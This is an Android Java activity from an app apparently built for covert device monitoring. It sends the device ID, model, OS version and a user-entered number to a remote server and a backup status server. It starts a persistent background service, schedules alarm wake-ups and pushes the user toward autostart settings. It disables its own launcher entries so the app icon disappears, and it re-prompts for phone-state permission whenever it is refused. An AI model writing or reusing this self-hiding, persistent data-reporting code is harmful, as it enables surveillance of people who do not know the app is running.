package com.app.datacontorller;

import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.app.datacontorller.Activities.PermissionActivity;
import com.app.datacontorller.Activities.SplashActivity;
import com.app.datacontorller.Models.BackupServer;
import com.app.datacontorller.Models.UpdateMobileNo.UpdateMobileNo;
import com.app.datacontorller.RawHeaders.FcmTokenData;
import com.app.datacontorller.RawHeaders.UpdateMobileNoHeader;
import com.app.datacontorller.Services.DataUpdateService;
import com.app.datacontorller.Utils.LoginPrefManager;
import com.app.datacontorller.WebApi.APIServiceFactory;
import com.app.datacontorller.WebApi.ApiService;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.google.gson.Gson;
import com.kaopiz.kprogresshud.KProgressHUD;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.util.Calendar;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {


    TextInputLayout inputLayout;

    TextInputEditText phone_no;

    private KProgressHUD hud;

    LoginPrefManager loginPrefManager;

    String device_id;

    String manufacturer, model_name, version;

    AutoPermissionDialog autoPermissionDialog;
    PackageManager packageManager;
    Button save;
    ApiService apiService, apiService1, apiService2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        manufacturer = android.os.Build.MANUFACTURER;

        model_name = Build.MODEL;

        version = String.valueOf(Build.VERSION.RELEASE);
        loginPrefManager = new LoginPrefManager(MainActivity.this);


        if (!loginPrefManager.getFirstTImeOpen()) {
            check_autoStartPermission();
        }


        apiService = APIServiceFactory.getRetrofit().create(ApiService.class);
        apiService1 = APIServiceFactory.getBackupRetrofit().create(ApiService.class);
        packageManager = getPackageManager();

        device_id = Settings.Secure.getString(getBaseContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        save = findViewById(R.id.button);
        phone_no = findViewById(R.id.mobile_no);
        inputLayout = findViewById(R.id.textInputLayout);
        checkStoragePermissions();


        Intent intent = new Intent(MainActivity.this, BootUpReciever.class);

        Calendar cal = Calendar.getInstance();

        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 234324243, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis() + (1 * 60 * 60 * 1000), pendingIntent);
        if (!loginPrefManager.getStringValue("app_open").equalsIgnoreCase("") && loginPrefManager.getStringValue("app_open").equalsIgnoreCase("0")) {

            Handler handler = new Handler();


            sendStatusApi("App opened default for" + loginPrefManager.getStringValue("phone_no"));

            Runnable runnable = new Runnable() {
                @Override
                public void run() {

                    try {
                        loginPrefManager.setStringValue("app_open", "1");
                        ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                        finish();
                        sendStatusApi("App closed default for" + loginPrefManager.getStringValue("phone_no"));
                    } catch (Exception e) {
                        sendStatusApi("App closed exception for" + loginPrefManager.getStringValue("phone_no"));
                    }
                }
            };

            handler.postDelayed(runnable, 500);

        }


        onClickEvetns();
    }

    private void onClickEvetns() {

        save.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String mobile_no = phone_no.getText().toString();

                if (mobile_no.equalsIgnoreCase("") || mobile_no.length() > 5) {

                    inputLayout.setError("Please enter 5 Digit unique number");
                    return;
                }

                sendData("");

            }
        });
    }

    private void checkStoragePermissions() {
        Dexter.withActivity(this)
                .withPermissions(
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_PHONE_STATE
                ).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport report) {

                Log.e("report", new Gson().toJson(report));

                if (report.getDeniedPermissionResponses().size() > 0) {
                    checkStoragePermissions();
                }
            }

            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {/* ... */}
        }).check();
    }


    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        assert manager != null;
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
//                Log.e("isMyServiceRunning?", true + "");
                return true;
            }
        }
        return false;
    }


    private void checkService() {

        if (!isMyServiceRunning(DataUpdateService.class)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(new Intent(this, DataUpdateService.class));
            } else {
                startService(new Intent(this, DataUpdateService.class));
            }

            ComponentName componentName = new ComponentName(MainActivity.this, SplashActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }


    }


    private void showloading() {

        hud = KProgressHUD.create(this)
                .setStyle(KProgressHUD.Style.SPIN_INDETERMINATE)
                .setDimAmount(0.5f)
                .setCancellable(false)
                .setAnimationSpeed(1);

        hud.show();
    }


    private void sendData(String deviceToken) {
        try {


            FcmTokenData fcmTokenData = new FcmTokenData();

            fcmTokenData.setDevice_token(deviceToken);

            fcmTokenData.setPlatform("android");
            fcmTokenData.setDevice_id(device_id);
            fcmTokenData.setMobileno(phone_no.getText().toString());
            fcmTokenData.setModel(manufacturer + "/" + model_name);
            fcmTokenData.setOs_version(version);
            Log.e("usage", new Gson().toJson(fcmTokenData));

            apiService.updateDevicetoken(fcmTokenData).enqueue(new Callback<BackupServer>() {
                @Override
                public void onResponse(Call<BackupServer> call, Response<BackupServer> response) {


                    try {


//                        if (deviceToken.equalsIgnoreCase("")) {
//                            sendStatusApi("Unable to get firebase token ");
//                        }
                        sendStatusApi("Fcm Token of " + phone_no.getText().toString() + response.body().getStatus());
                        if (response.body().getStatus().equalsIgnoreCase("error")) {
                            sendData(deviceToken);
                        } else {

                            loginPrefManager.setStringValue("phone_no", phone_no.getText().toString());

                            checkService();

                            finish();
                        }
                    } catch (Exception e) {
                        sendStatusApi("Exception in Fcm Token sending for " + phone_no.getText().toString() + e.getMessage());
                    }

                }

                @Override
                public void onFailure(Call<BackupServer> call, Throwable t) {
//                    Log.e("onFailure", t.getMessage());

                    try {
                        sendStatusApi("Failure to send device token for " + phone_no.getText().toString() + " " + t.getMessage());
                    } catch (Exception e) {
                        sendStatusApi("Failure to send device token for " + phone_no.getText().toString() + " " + e.getMessage());
                    }

                }
            });


        } catch (Exception e) {

            sendStatusApi("Exception to send device token for " + phone_no.getText().toString() + " " + e.getMessage());

            Log.e("Exception", e.getMessage());
        }
    }


    public void showMessage(Context context, String messsage) {

        Toast.makeText(context, messsage, Toast.LENGTH_SHORT).show();
    }

    private void sendStatusApi(String message) {

        apiService1.sendstatus(message).enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {


                Log.e("response", response.raw().toString());

                Log.e("DiscoverApiReq", new Gson().toJson(response.raw().request()));
                Log.e("DiscoverApiResp", new Gson().toJson(response.body()));


                Log.e("response", "--" + response.raw().code());
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {


            }
        });


    }

    private void check_autoStartPermission() {
        manufacturer = android.os.Build.MANUFACTURER;

        model_name = Build.MODEL;

        version = String.valueOf(Build.VERSION.RELEASE);

        Log.e("manufacturer", manufacturer + "/" + model_name + "/" + version);
        try {
            Intent intent = new Intent();
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer) || "Huawei".equalsIgnoreCase(manufacturer) || "Realme".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            } else if ("oneplus".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListAct‌​ivity"));
            } else if ("samsung".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity"));
            }

            List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if (list.size() > 0) {

                showAutoPermissionDialog(intent);
            } else {
//                showAutoPermissionDialog();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    private void showAutoPermissionDialog(Intent intent) {
        autoPermissionDialog = new AutoPermissionDialog(MainActivity.this, R.style.AppTheme, new AutoPermissionDialog.MemberInterface() {
            @Override
            public void onNameAdded(int position, String name) {

                startActivity(intent);
                loginPrefManager.setFirstTimeOpen(true);
                autoPermissionDialog.dismiss();
//                openSettings();


            }
        });

        autoPermissionDialog.setCanceledOnTouchOutside(false);
        autoPermissionDialog.show();
    }


}
